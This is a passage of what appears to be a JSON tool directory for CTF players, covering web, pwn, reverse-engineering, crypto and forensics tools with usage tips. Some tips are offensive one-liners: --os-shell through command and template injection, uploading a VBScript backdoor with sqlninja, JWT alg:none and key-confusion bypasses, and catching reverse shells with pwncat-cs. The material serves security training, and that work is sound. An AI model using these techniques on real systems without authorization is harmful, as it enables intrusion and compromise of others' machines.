Often finds exposed files like /phpinfo.php, /server-status, or old backup files that hint at the challenge path.", "link": "https://github.com/sullo/nikto"}, {"name": "XSStrike", "platform": "Linux", "priority": "Important", "desc": "Advanced XSS detection and exploitation tool", "why": "Finds and exploits XSS better than most automated scanners", "tips": "Use --crawl to auto-discover XSS points across the site. --blind mode tests for blind XSS with callbacks. When you find a reflected param in Burp, use XSStrike to automate payload generation.", "link": "https://github.com/s0md3v/XSStrike"}, {"name": "Commix", "platform": "Linux", "priority": "Important", "desc": "Command injection exploitation tool", "why": "Automates OS command injection attacks in web challenges", "tips": "Pass a vulnerable URL with --url and mark the injection point with an asterisk. Use --os-shell to drop into an interactive shell if injection is confirmed. Works against both GET and POST parameters.", "link": "https://github.com/commixproject/commix"}, {"name": "JWT Tool", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "JWT analysis and attack toolkit", "why": "Essential for JWT-based authentication challenges", "tips": "Always check the header algorithm first. Common attacks: alg:none bypass, RS256 to HS256 confusion using the public key as HMAC secret, weak secret brute-force. Use --exploit k with known public key for RS256 attacks.", "link": "https://github.com/ticarpi/jwt_tool"}, {"name": "Wappalyzer", "platform": "Browser Extension", "priority": "Important", "desc": "Technology fingerprinting browser extension", "why": "Instantly identifies CMS, frameworks, and server stack", "tips": "Install in Firefox or Chrome and it auto-detects tech on every page visit. Knowing the stack (WordPress, Laravel, Express) immediately narrows down which CVEs or misconfigurations to test first.", "link": "https://www.wappalyzer.com"}, {"name": "WFuzz", "platform": "Linux", "priority": "Important", "desc": "Web application fuzzer with rich filter expressions", "why": "Flexible fuzzing with advanced filter and matcher options", "tips": "Use FUZZ as the injection marker. Filter by response code with --sc 200 or by word count with --sw. Multiple FUZZ markers (FUZZ, FUZ2Z) allow fuzzing multiple parameters simultaneously.", "link": "https://github.com/xmendez/wfuzz"}, {"name": "Caido", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Modern Rust-based Burp Suite alternative", "why": "Faster and lighter proxy rising in the CTF community", "tips": "Workflow system lets you automate repetitive request modifications. Useful when Burp feels slow on large applications. Great for teams sharing findings via its project export feature.", "link": "https://caido.io"}, {"name": "Wfuzz", "platform": "Linux/Python", "priority": "Important", "desc": "Web application fuzzer for brute-forcing GET/POST parameters, headers, cookies, and authentication.", "why": "Flexible payload injection points make it good for testing custom parameters beyond just paths.", "tips": "Use the FUZZ keyword anywhere in the request, including headers and POST bodies.", "link": "https://github.com/xmendez/wfuzz"}, {"name": "NoSQLMap", "platform": "Linux/Python", "priority": "Useful", "desc": "Automates NoSQL injection and exploitation, primarily for MongoDB-backed applications.", "why": "NoSQL injection is increasingly common in modern web challenges using MongoDB.", "tips": "Check login forms for $where, $ne, and $regex operator injection even without this tool first.", "link": "https://github.com/codingo/NoSQLMap"}, {"name": "SQLNinja", "platform": "Linux/Perl", "desc": "Exploits SQL injection on Microsoft SQL Server to gain OS access, upload backdoors, and escalate privileges.", "why": "Specialized for MSSQL which has unique features like xp_cmdshell for direct OS commands.", "tips": "sqlninja -m upload to upload a VBScript backdoor. Works best after confirming MSSQL via Nmap banner grab.", "link": "https://sqlninja.sourceforge.net"}, {"name": "Dalfox", "platform": "Linux", "desc": "Parameter analysis and XSS scanner with context-aware payload generation and DOM XSS detection.", "why": "More accurate than XSStrike for modern frameworks; understands reflection context to generate working payloads.", "tips": "dalfox url 'http://target/?q=FUZZ' for basic scan. Use --deep-domxss for JavaScript context analysis.", "link": "https://github.com/hahwul/dalfox"}, {"name": "Arjun", "platform": "Linux/Python", "desc": "HTTP parameter discovery tool that finds hidden GET and POST parameters using smart wordlists.", "why": "Hidden parameters are a common CTF vector; Arjun finds them without brute-forcing every possible name.", "tips": "arjun -u http://target/api -m POST -w /path/to/params.txt. Use -oJ to save results as JSON.", "link": "https://github.com/s0md3v/Arjun"}, {"name": "LinkFinder", "platform": "Linux/Python", "desc": "Discovers endpoints and sensitive info in JavaScript files by parsing and analyzing JS source.", "why": "Modern web apps put API endpoints and tokens in client-side JS; LinkFinder extracts them all.", "tips": "python3 linkfinder.py -i http://target -d for entire domain. Combine with JS beautifier for obfuscated code.", "link": "https://github.com/GerbenJavado/LinkFinder"}, {"name": "CORScanner", "platform": "Linux/Python", "desc": "Scans for CORS (Cross-Origin Resource Sharing) misconfigurations that allow data theft across origins.", "why": "CORS misconfigs let attacker domains read authenticated responses; common in CTF API challenges.", "tips": "python3 cors_scan.py -u http://target/api -H 'Cookie: session=abc'. Look for wildcard or reflected origins.", "link": "https://github.com/chenjj/CORScanner"}, {"name": "tplmap", "platform": "Linux/Python", "desc": "Server-Side Template Injection (SSTI) detection and exploitation tool supporting Jinja2, Twig, Freemarker, and more.", "why": "Automates SSTI detection and exploitation to RCE; much faster than manual payload testing for each engine.", "tips": "tplmap -u 'http://target/?name=*'. Once detected use --os-shell for command execution if engine supports it.", "link": "https://github.com/epinna/tplmap"}, {"name": "GitDumper / git-dumper", "platform": "Linux/Python", "desc": "Downloads and reconstructs Git repositories from exposed .git directories on web servers.", "why": "Exposed .git is one of the most common CTF web findings; gives you full source code and commit history.", "tips": "git-dumper http://target/.git ./output. Then cd output && git log --all to see all commits and hidden branches.", "link": "https://github.com/arthaud/git-dumper"}, {"name": "Hakrawler", "platform": "Linux", "desc": "Simple and fast web crawler designed to find endpoints and assets in web applications.", "why": "Quick passive discovery of all URLs, forms, and assets before deeper testing.", "tips": "echo 'http://target' | hakrawler -d 3 | tee urls.txt. Pipe into httpx or nuclei for follow-up.", "link": "https://github.com/hakluke/hakrawler"}, {"name": "SSRFmap", "platform": "Linux/Python", "desc": "Automatic Server-Side Request Forgery exploitation and detection tool.", "why": "SSRF can leak cloud metadata, access internal services, and lead to RCE; SSRFmap automates the exploitation chain.", "tips": "python3 ssrfmap.py -r request.txt -p param -m portscan to scan internal ports via SSRF.", "link": "https://github.com/swisskyrepo/SSRFmap"}], "toolgrid-pwn": [{"name": "pwntools", "platform": "Linux", "priority": "Must Master", "desc": "Python CTF exploit scripting framework", "why": "De-facto pwn library for scripting exploits, shellcode, and ROP", "tips": "Use context.arch and context.os to set target. process() for local, remote() for network. cyclic(100) generates De Bruijn patterns to find offsets. flat() packs values. ELF() parses binaries. p64() and u64() are your most-used functions.", "link": "https://github.com/Gallopsled/pwntools"}, {"name": "GDB with pwndbg", "platform": "Linux", "priority": "Must Master", "desc": "GNU debugger with CTF-focused plugin", "why": "Step through execution, inspect registers, and find BOF offsets", "tips": "Use cyclic 100 to generate a pattern, run the binary, then cyclic -l VALUE from the crash to get the exact offset. commands: stack, heap, got, plt, vmmap, telescope. Set breakpoints with b *address.", "link": "https://github.com/pwndbg/pwndbg"}, {"name": "checksec", "platform": "Linux", "priority": "Must Master", "desc": "Binary security property checker", "why": "Instantly reveals NX, PIE, RELRO, stack canary, and FORTIFY status", "tips": "Run checksec --file=binary before anything else. No NX means you can run shellcode. No PIE means addresses are fixed. No canary means stack smashing is easier. Partial RELRO means GOT is writable.", "link": "https://github.com/slimm609/checksec.sh"}, {"name": "ROPgadget", "platform": "Linux", "priority": "Must Master", "desc": "ROP chain gadget finder", "why": "Finds gadgets for ret2libc, ASLR bypass, and DEP bypass", "tips": "ROPgadget --binary ./vuln --rop --depth 5 to find chains. Filter with grep: ROPgadget --binary ./vuln | grep pop.rdi. Combine with pwntools to build ROP chains dynamically in your exploit script.", "link": "https://github.com/JonathanSalwan/ROPgadget"}, {"name": "one_gadget", "platform": "Linux", "priority": "Must Master", "desc": "Finds one-gadget execve shell in libc", "why": "Finds single-address gadgets that immediately spawn a shell", "tips": "Run one_gadget /lib/x86_64-linux-gnu/libc.so.6. Each gadget has constraints (registers that must be null or valid). Check which constraints are satisfied at your control point and pick the right gadget.", "link": "https://github.com/david942j/one_gadget"}, {"name": "ropper", "platform": "Linux", "priority": "Important", "desc": "ROP gadget finder and chain builder", "why": "Alternative to ROPgadget with an interactive chain building UI", "tips": "Use ropper -f binary --search pop.rdi to find specific gadgets. The interactive mode lets you search and assemble chains interactively. Supports MIPS, ARM, and x86 unlike some alternatives.", "link": "https://github.com/sashs/Ropper"}, {"name": "libc-database", "platform": "Linux / Web", "priority": "Important", "desc": "Libc version lookup from leaked function offsets", "why": "Identifies the remote libc version to build precise ROP chains", "tips": "Leak a function address (puts, printf) via format string or GOT read. Calculate the offset within libc. Use the database to find which libc version matches. Then calculate system and /bin/sh addresses.", "link": "https://github.com/niklasb/libc-database"}, {"name": "seccomp-tools", "platform": "Linux", "priority": "Important", "desc": "Seccomp sandbox analyzer", "why": "Understand sandboxed syscall restrictions in pwn challenges", "tips": "Use seccomp-tools dump ./binary to see exactly which syscalls are allowed. If execve is blocked, try execveat or use an open+read+write chain to read the flag file instead of spawning a shell.", "link": "https://github.com/david942j/seccomp-tools"}, {"name": "pwninit", "platform": "Linux", "priority": "Important", "desc": "Auto-patches binaries for local pwn setup", "why": "Patches binary runpath to match the provided remote libc automatically", "tips": "Drop the binary, libc.so.6, and ld.so in one folder and run pwninit. It patches the binary so it uses the exact same libc as the remote server, preventing exploit differences between local and remote.", "link": "https://github.com/io12/pwninit"}, {"name": "shellcraft", "platform": "Linux", "priority": "Important", "desc": "Shellcode generator inside pwntools", "why": "Generates architecture-specific shellcode for any target", "tips": "Use shellcraft.sh() for a simple execve shell. shellcraft.cat('/flag') to read a file. Encode with asm(shellcraft.sh()) to get raw bytes. Use shellcraft.amd64.linux.sh() for explicit arch targeting.", "link": "https://docs.pwntools.com/en/stable/shellcraft.html"}, {"name": "GEF", "platform": "Linux", "priority": "Important", "desc": "GDB Enhanced Features plugin alternative to pwndbg", "why": "Provides heap visualization and memory inspection in GDB", "tips": "Use heap bins to inspect malloc chunks. format-string-helper identifies format string vulnerability positions. Use gef config to tune display preferences. Good alternative if pwndbg causes issues.", "link": "https://github.com/hugsy/gef"}, {"name": "qemu-user", "platform": "Linux", "priority": "Important", "desc": "User-mode CPU emulator for foreign architectures", "why": "Run ARM, MIPS, PowerPC binaries locally to test exploits", "tips": "qemu-arm -L /usr/arm-linux-gnueabi ./binary runs ARM binaries on x86. Combine with gdb: qemu-arm -g 1234 ./binary then gdb-multiarch connects on port 1234 for cross-arch debugging.", "link": "https://www.qemu.org"}, {"name": "GDB + GEF", "platform": "Linux/CLI", "priority": "Must Master", "desc": "GNU Debugger enhanced with GEF (GDB Enhanced Features), adds memory visualization, exploit helpers, and heap analysis.", "why": "The core dynamic analysis tool for every pwn challenge, lets you step through execution and inspect memory live.", "tips": "Use 'context' to see registers/stack/code at once; 'heap chunks' for heap exploitation.", "link": "https://github.com/hugsy/gef"}, {"name": "pwncat-cs", "platform": "Linux/Python", "desc": "Enhanced reverse shell handler with built-in file transfer, privilege escalation enumeration, and persistence.", "why": "More powerful than netcat for catching shells; provides stable PTY and automates post-exploitation steps.", "tips": "pwncat-cs -lp 4444. Once connected: upload file and download flag. Use enumerate to check privesc vectors.", "link": "https://github.com/calebstewart/pwncat"}, {"name": "heap-exploitation tools", "platform": "Linux/Python", "desc": "Collection of heap visualization and exploitation utilities for glibc heap challenges (tcache, fastbins, etc).", "why": "Modern PWN challenges increasingly involve heap exploitation which requires specialized visualization tools.", "tips": "Use GEF heap bins command to inspect tcache and fastbins. vis_heap_chunks shows heap layout. heapinfo for summary.", "link": "https://github.com/hugsy/gef"}, {"name": "Pwndbg", "platform": "Linux", "desc": "GDB plugin with CTF-focused features including heap inspection, ROP chain building, and exploit development helpers.", "why": "The most popular GDB enhancement for CTF pwn; better than GEF for most challenges.", "tips": "cyclic pattern, telescope for memory, nearpc for surrounding code, got for GOT table, vmmap for memory layout.", "link": "https://github.com/pwndbg/pwndbg"}, {"name": "PEDA", "platform": "Linux", "desc": "Python Exploit Development Assistance for GDB, adds color-coded context, pattern create/offset, and ROP helpers.", "why": "Classic alternative to pwndbg; some prefer its interface for BOF offset finding.", "tips": "pattern create 200 to generate, pattern offset VALUE after crash. searchmem for finding strings in memory.", "link": "https://github.com/longld/peda"}, {"name": "RetDec", "platform": "Linux/Win/Mac", "desc": "Retargetable machine-code decompiler supporting many architectures including ARM, MIPS, PowerPC, and x86.", "why": "When Ghidra output is unclear, RetDec often produces cleaner C pseudocode for complex binaries.", "tips": "retdec-decompiler binary.elf --select-decode-only --select-functions main. Output is a .c file with pseudocode.", "link": "https://github.com/avast/retdec"}, {"name": "Pwninit", "platform": "Linux", "desc": "Automates pwn challenge setup: patches binary with correct libc/ld, creates solve.py template.", "why": "Eliminates the tedious local setup process so you can focus on actual exploitation from the start.", "tips": "Drop binary, libc.so.6, ld-linux.so in same folder and run pwninit. Creates a patched binary and Python template.", "link": "https://github.com/io12/pwninit"}], "toolgrid-re": [{"name": "Ghidra", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "NSA open-source reverse engineering suite with decompiler", "why": "Free IDA alternative with an excellent decompiler for CTF RE", "tips": "Use the decompiler window alongside the disassembly view. Rename variables and functions as you understand them. The Script Manager lets you run Python/Java scripts to automate analysis. Search strings with Search > For Strings.", "link": "https://ghidra-sre.org"}, {"name": "IDA Free", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "Industry-standard disassembler and decompiler free tier", "why": "Gold standard for RE; free version covers most CTF binaries", "tips": "Press F5 in IDA to decompile a function. Use N to rename, Y to retype variables. The cross-references window (X) shows where a function or variable is used. Patch bytes with Edit > Patch Program.", "link": "https://hex-rays.com/ida-free"}, {"name": "strings", "platform": "Linux", "priority": "Must Master", "desc": "Extract printable strings from any binary file", "why": "First triage step to find hardcoded flags, keys, or hints", "tips": "Run strings binary | grep -i flag or strings binary | grep -E '[A-Z]{3}\\{'. Use -n 6 to catch shorter strings. Use strings -e l for Unicode. Always the very first command to run on any unknown file.", "link": "https://linux.die.net/man/1/strings"}, {"name": "ltrace and strace", "platform": "Linux", "priority": "Must Master", "desc": "Library and system call tracers", "why": "Dynamically trace calls without needing source code", "tips": "strace shows OS-level syscalls (open, read, execve). ltrace shows library calls (strcmp, printf, malloc). Run ltrace ./binary and watch for strcmp(input, correct_password) patterns that leak the answer.", "link": "https://strace.io"}, {"name": "dnSpy", "platform": "Windows", "priority": "Must Master", "desc": ".NET assembly decompiler and debugger", "why": "Essential for any .NET or C# reverse engineering challenge", "tips": "Open the .exe or .dll directly and see clean C# source. Set breakpoints and debug in place without recompiling. Edit and save methods directly. Look for obfuscated string decryption routines as they often hide the flag logic.", "link": "https://github.com/dnSpy/dnSpy"}, {"name": "jadx", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "Android APK decompiler to readable Java", "why": "Vital for Android RE challenges in mobile CTF categories", "tips": "Open the APK directly; jadx auto-extracts and decompiles. Look in MainActivity first, then trace any obfuscated decode functions. Use jadx-gui Search > Text to search across all decompiled classes at once.", "link": "https://github.com/skylot/jadx"}, {"name": "GDB with pwndbg", "platform": "Linux", "priority": "Must Master", "desc": "Dynamic debugger for runtime binary analysis", "why": "Step through execution to understand control flow at runtime", "tips": "Set a breakpoint at main with b main then run. Use ni (next instruction) and si (step into). Inspect registers with info registers. Use x/20wx addr to examine memory as hex words.", "link": "https://github.com/pwndbg/pwndbg"}, {"name": "Binary Ninja", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Modern binary analysis platform with Python API", "why": "Clean UI and powerful scripting for automating analysis tasks", "tips": "The Python API lets you automate repetitive analysis like renaming all XREFs to a decryption function. Medium-level IL (MLIL) is easier to read than raw assembly for complex binaries.", "link": "https://binary.ninja"}, {"name": "Radare2", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Open-source CLI reverse engineering framework", "why": "Powerful and scriptable for automated analysis pipelines", "tips": "Key commands: aaa (analyze all), afl (list functions), pdf @ function (disassemble), VV (visual mode). Use r2pipe in Python to script analysis. Steep learning curve but very powerful for scripting.", "link": "https://rada.re/n"}, {"name": "x64dbg", "platform": "Windows", "priority": "Important", "desc": "Windows user-mode debugger for PE binaries", "why": "Best tool for dynamically debugging Windows executable files", "tips": "Use the Run to User Code button to skip past DLL init noise. Right-click any call to set a breakpoint. The memory map view shows all loaded modules. Great for unpacking malware or crackme challenges on Windows.", "link": "https://x64dbg.com"}, {"name": "apktool", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "APK unpacking and repackaging tool", "why": "Unpacks APK resources and smali bytecode for analysis", "tips": "apktool d app.apk to decompile. Edit smali files, then apktool b app to repack. Use with a custom keystore to sign and install modified APKs. Useful when jadx output is unclear and you need to patch behavior.", "link": "https://apktool.org"}, {"name": "Detect-It-Easy", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Packer and compiler identifier for executables", "why": "Identifies packers, obfuscators, and compiler signatures before reversing", "tips": "Always run this before opening in Ghidra or IDA. If a packer is detected (UPX, MPRESS), unpack first with the appropriate tool. Knowing the compiler (GCC vs MSVC) helps understand calling conventions.", "link": "https://github.com/horsicq/Detect-It-Easy"}, {"name": "Frida", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Dynamic instrumentation toolkit for runtime hooking", "why": "Hook and modify function behavior at runtime in RE and mobile challenges", "tips": "Use frida-trace -i 'strcmp' ./binary to auto-trace calls. Write Python scripts with frida.attach() to hook specific functions and log or modify arguments. Essential for Android certificate pinning bypass.", "link": "https://frida.re"}, {"name": "angr", "platform": "Linux", "priority": "Important", "desc": "Binary analysis and symbolic execution framework", "why": "Automatically solve CTF binaries by reasoning about all possible paths", "tips": "Use simgr.explore(find=win_addr, avoid=fail_addr) to automatically find input that reaches the win condition. Best for crackme challenges with complex input validation. Can be slow on large binaries.", "link": "https://angr.io"}, {"name": "UPX", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Packer and unpacker for executable files", "why": "Unpack UPX-packed binaries before attempting to reverse them", "tips": "Run upx -d binary to unpack. If the binary is UPX-packed Ghidra will show mostly garbage until you unpack. After unpacking, re-run Detect-It-Easy to check for additional layers of packing.", "link": "https://upx.github.io"}, {"name": "Cutter", "platform": "Linux/Windows/Mac", "priority": "Useful", "desc": "Free GUI front-end for Radare2, providing graph view, decompiler, and debugger in one interface.", "why": "Easier learning curve than raw Radare2 commands while staying completely free and open-source.", "tips": "Enable the built-in decompiler (ghidra or r2dec plugin) for pseudo-C output.", "link": "https://cutter.re/"}, {"name": "BinDiff", "platform": "Linux/Win/Mac", "desc": "Binary code comparison tool for identifying differences and similarities between two compiled binaries.", "why": "Compare a patched vs original binary to find exactly what changed; useful for CTF patch diffing.", "tips": "Export from Ghidra or IDA with BinExport, then compare in BinDiff. The changed functions are highlighted in red.", "link": "https://github.com/google/bindiff"}, {"name": "Triton", "platform": "Linux", "desc": "Dynamic binary analysis framework providing concolic execution, taint analysis, and constraint solving.", "why": "More powerful than angr for specific tasks; taint analysis tracks data flow through complex programs.", "tips": "Use pintool backend for dynamic analysis. Define symbolic variables at input points and solve constraints.", "link": "https://github.com/JonathanSalwan/Triton"}, {"name": "FLOSS", "platform": "Linux/Win/Mac", "desc": "FireEye Labs Obfuscated String Solver - automatically extracts deobfuscated strings from malware binaries.", "why": "Many CTF RE challenges obfuscate strings; FLOSS decrypts them automatically without manual analysis.", "tips": "floss binary.exe. Often reveals flags, URLs, and keys that don't show up with regular strings command.", "link": "https://github.com/mandiant/flare-floss"}, {"name": "Miasm", "platform": "Linux/Python", "desc": "Reverse engineering framework with its own IR (intermediate representation) for advanced analysis and emulation.", "why": "Useful for complex deobfuscation, custom ISA challenges, and automated exploit generation.", "tips": "Use sandbox.run_until_return() to emulate functions. IR transforms make complex obfuscation easier to analyze.", "link": "https://github.com/cea-sec/miasm"}, {"name": "BARF", "platform": "Linux/Python", "desc": "Binary Analysis and Reverse engineering Framework with code lifting, symbolic execution, and CFG reconstruction.", "why": "Academic-grade analysis tool for advanced RE research and complex challenge solving.", "tips": "Lift binary to REIL IR for architecture-independent analysis. Use CFG reconstruction to visualize complex control flow.", "link": "https://github.com/programa-stic/barf-project"}, {"name": "RE:Mind", "platform": "Web", "desc": "Browser-based assembly emulator and debugger for x86/x64, MIPS, and ARM code snippets.", "why": "Quick way to test assembly snippets and understand unfamiliar instructions without setting up a full environment.", "tips": "Paste assembly code and step through execution watching register changes. Great for quick one-off assembly analysis.", "link": "https://godbolt.org"}], "toolgrid-crypto": [{"name": "CyberChef", "platform": "Web / Local", "priority": "Must Master", "desc": "Visual data transformation and crypto swiss-army knife", "why": "Hundreds of transforms in one tool; the number one crypto CTF resource", "tips": "Use the Magic operation to auto-detect encodings. Chain operations with the Recipe panel. Use Fork to process multiple inputs. Download locally for offline use. Learn to read and share recipe URLs with teammates.", "link": "https://gchq.github.io/CyberChef"}, {"name": "SageMath", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "Mathematics system for number theory and cryptanalysis", "why": "Solves RSA, ECC, discrete log, and lattice-based challenges", "tips": "Use Integer factorization: factor(n). Discrete log: discrete_log(c, g, p). For RSA: pow(c, d, n). Learn the basics of polynomial rings and finite fields as CTF crypto increasingly uses them.", "link": "https://www.sagemath.org"}, {"name": "RsaCtfTool", "platform": "Linux", "priority": "Must Master", "desc": "Automated RSA attack toolkit", "why": "Automates Wiener, Fermat, small exponent, and common factor attacks", "tips": "Pass --publickey key.pem --uncipherfile cipher.txt for automatic attack selection. Use --attack all to try every known attack. When given multiple public keys check for shared factors with --attack common_factors.", "link": "https://github.com/RsaCtfTool/RsaCtfTool"}, {"name": "pycryptodome", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "Python cryptography library for implementing and breaking ciphers", "why": "Write custom solvers and attack implementations in Python", "tips": "from Crypto.Util.number import long_to_bytes, bytes_to_long for RSA. AES.new(key, AES.MODE_CBC, iv) for block cipher challenges. Use Crypto.PublicKey.RSA to parse PEM keys.", "link": "https://pycryptodome.readthedocs.io"}, {"name": "hashcat", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "GPU-accelerated hash cracking tool", "why": "Cracks MD5, SHA, bcrypt, and NTLM at extreme speed", "tips": "hashcat -m 0 hash.txt rockyou.txt for MD5. Use -a 3 for mask attacks: ?u?l?l?l?d?d for uppercase+lowercase+digits patterns. -m 1800 for sha512crypt. Always check the example hashes page to confirm the correct mode number.", "link": "https://hashcat.net/hashcat"}, {"name": "z3", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "SMT solver and constraint satisfaction engine", "why": "Solves complex equations in crypto, RE, and logic challenges", "tips": "Create variables with z3.Int or z3.BitVec, add constraints with solver.add(), call solver.check(), then solver.model() to read results. If the problem has equations over unknown values, z3 almost certainly solves it.", "link": "https://github.com/Z3Prover/z3"}, {"name": "xortool", "platform": "Linux", "priority": "Important", "desc": "XOR key length analysis and recovery tool", "why": "Automatically guesses XOR key length and value", "tips": "xortool file.bin to analyze. Use -l length to specify known key length. Use -c 20 if the most common byte is 0x20 (space, common in English plaintext). Combine with CyberChef to decode the recovered plaintext.", "link": "https://github.com/hellman/xortool"}, {"name": "dcode.fr", "platform": "Web", "priority": "Important", "desc": "Online solver for 200+ classical ciphers and encodings", "why": "Identifies and solves unknown classical ciphers automatically", "tips": "Use the Cipher Identifier first when you do not recognize the cipher. Covers Vigenere, Rail Fence, Playfair, Beaufort, and many more. The ROT cipher page handles all ROT variants with one click.", "link": "https://www.dcode.fr"}, {"name": "factordb.com", "platform": "Web", "priority": "Important", "desc": "Online integer factorization database", "why": "Instantly factors weak RSA moduli that are already in the database", "tips": "Always check factordb before trying to factor an RSA modulus yourself. Paste n directly into the search box. If the factors are known, you get p and q immediately. Use the API for scripted lookups.", "link": "http://factordb.com"}, {"name": "gmpy2", "platform": "Linux", "priority": "Important", "desc": "GMP-based Python library for big-integer arithmetic", "why": "Fast big-integer math for RSA and number theory challenges", "tips": "gmpy2.iroot(n, 2) for integer square root (used in Fermat factoring). gmpy2.invert(e, phi) to compute modular inverse for d. Much faster than Python built-ins for large numbers in RSA solves.", "link": "https://gmpy2.readthedocs.io"}, {"name": "openssl CLI", "platform": "Linux / Win / Mac", "priority": "Important", "desc": "Cryptographic operations from the command line", "why": "Decrypt, sign, verify, and inspect certificates and keys", "tips": "openssl rsa -in key.pem -text -noout to read RSA key parameters. openssl enc -d -aes-256-cbc -in file.enc to decrypt. openssl s_client -connect host:443 to inspect TLS certificates during network challenges.", "link": "https://www.openssl.org"}, {"name": "quipqiup", "platform": "Web", "priority": "Important", "desc": "Automatic substitution cipher solver", "why": "Solves simple substitution ciphers in seconds using frequency analysis", "tips": "Paste ciphertext directly and click Solve. If it fails, try providing a crib (known plaintext fragment) in the Clues field. Works best on longer ciphertexts where frequency analysis has enough data.", "link": "https://quipqiup.com"}, {"name": "Cado-NFS", "platform": "Linux", "priority": "Useful", "desc": "Number Field Sieve factorization implementation", "why": "Factors large RSA moduli for advanced factoring challenges", "tips": "Use only when factordb and Fermat factoring both fail and the modulus is under 512 bits. Requires significant compute time and resources. For CTF purposes, a 512-bit modulus may take minutes to hours.", "link": "https://gitlab.inria.fr/cado-nfs/cado-nfs"}, {"name": "feal-cipher / block cipher toolkits", "platform": "Python", "priority": "Useful", "desc": "Custom and reference implementations of block ciphers (Feistel networks, FEAL, DES variants) for differential/linear cryptanalysis practice.", "why": "Advanced CTFs sometimes use custom block ciphers, understanding cipher internals helps spot weaknesses.", "tips": "Look for repeated S-box patterns or weak key schedules in custom cipher implementations.", "link": "https://github.com/Cryptosaurus"}, {"name": "Cryptohack", "platform": "Web", "desc": "Interactive cryptography learning platform with challenges covering AES, RSA, ECC, DH, and more.", "why": "The best resource for learning modern crypto attacks that appear in CTF competitions.", "tips": "Complete the Intro tracks first. The General and Mathematics sections build foundations for harder challenges.", "link": "https://cryptohack.org"}, {"name": "PyCryptodome", "platform": "Linux/Python", "desc": "Self-contained Python cryptography library implementing all major ciphers, modes, hashes, and public key algorithms.", "why": "The standard Python crypto library for CTF; implement custom attacks, decrypt ciphertexts, forge signatures.", "tips": "from Crypto.Util.number import long_to_bytes, bytes_to_long. from Crypto.Cipher import AES for block ciphers.", "link": "https://pycryptodome.readthedocs.io"}, {"name": "Sympy", "platform": "Linux/Python", "desc": "Python mathematics library for number theory, algebra, and symbolic computation.", "why": "Faster than plain Python for crypto math; factoring, modular arithmetic, and polynomial operations.", "tips": "from sympy import factorint, mod_inverse, isprime. factorint(n) for RSA factoring. mod_inverse(e, phi) for d.", "link": "https://www.sympy.org"}, {"name": "Ciphey", "platform": "Linux/Python", "desc": "AI-powered automatic decryption tool that identifies and decodes over 50 cipher types without knowing the encoding.", "why": "Saves time on multi-layer encoding challenges; just paste the ciphertext and it chains decoders automatically.", "tips": "ciphey -t 'encoded_string' or cat file | ciphey. Uses machine learning to identify the encoding type.", "link": "https://github.com/Ciphey/Ciphey"}, {"name": "hashID", "platform": "Linux/Python", "desc": "Identifies hash types from their format with detailed output including Hashcat and John mode numbers.", "why": "More detailed than name-that-hash; provides direct hashcat -m and john --format values.", "tips": "hashid 'hashvalue' -m for hashcat mode -j for john format. hashid -f hashfile.txt for multiple hashes.", "link": "https://github.com/psypanda/hashID"}, {"name": "ECCtools / SageMath ECC", "platform": "Linux/SageMath", "desc": "Elliptic curve cryptography tools for CTF challenges involving ECC, including MOV attack and invalid curve attacks.", "why": "ECC challenges are increasingly common in CTF; SageMath has built-in ECC support for most standard attacks.", "tips": "E = EllipticCurve(GF(p), [a,b]). discrete_log(Q, P) for ECDLP. PolynomialRing for lattice attacks.", "link": "https://www.sagemath.org"}, {"name": "CyberChef (offline)", "platform": "Local", "desc": "Downloadable version of CyberChef for use without internet access during network-restricted CTF competitions.", "why": "Some CTF venues restrict internet; the offline version has all 300+ operations available locally.", "tips": "Download from GitHub releases. The Magic operation still works offline. Use --lite builds for faster loading.", "link": "https://github.com/gchq/CyberChef/releases"}], "toolgrid-forensics": [{"name": "Autopsy", "platform": "Linux / Win", "priority": "Must Master", "desc": "Digital forensics and disk image analysis GUI", "why": "Examines disk images, timelines, and recovers deleted files", "tips": "Add a Data Source (disk image) and let ingest modules run. Check the Deleted Files section first in CTFs. The keyword search and file type filters save hours. Export interesting files by right-clicking.", "link": "https://www.autopsy.com"}, {"name": "Volatility 3", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "Memory forensics framework for RAM dump analysis", "why": "Analyzes RAM dumps to find processes, network connections, and credentials", "tips": "Always identify the profile first with vol.py -f mem.raw windows.info or linux.banner. Key plugins: pslist, netscan, filescan, dumpfiles, malfind, hashdump, cmdline. Use grep to filter large outputs.", "link": "https://github.com/volatilityfoundation/volatility3"}, {"name": "Wireshark", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "GUI network packet analyzer", "why": "Analyzes PCAP files to decode protocols and extract transferred files", "tips": "Use Statistics > Protocol Hierarchy for a quick overview. Follow TCP Stream to reassemble conversations. Export objects with File > Export Objects > HTTP to extract transferred files. Filter: http.request or tcp.stream eq 0.", "link": "https://www.wireshark.org"}, {"name": "Binwalk", "platform": "Linux", "priority": "Must Master", "desc": "Firmware analysis and file carving tool", "why": "Extracts hidden files and filesystems from binary blobs", "tips": "binwalk -e file to extract embedded files automatically. Use -M to recursively extract. binwalk --dd='.*' file for aggressive extraction of all signatures. Check the extracted directory for hidden archives or filesystems.", "link": "https://github.com/ReFirmLabs/binwalk"}, {"name": "ExifTool", "platform": "Linux / Win / Mac", "priority": "Must Master", "desc": "Metadata reader and writer for all file types", "why": "Finds hidden flags in EXIF, XMP, and comment metadata fields", "tips": "exiftool image.jpg shows all metadata. exiftool -Comment image.jpg for just the comment. Use exiftool -r directory/ to recursively process folders. Authors, GPS coordinates, and software versions often hint at the challenge.", "link": "https://exiftool.org"}, {"name": "StegSolve", "platform": "Linux / Win", "priority": "Must Master", "desc": "Image steganography visual analyzer", "why": "Inspects bit planes to reveal hidden images and text in images", "tips": "Cycle through color planes with the arrow buttons. Red/Green/Blue plane 0 often hides LSB data. The Combine function compares two images 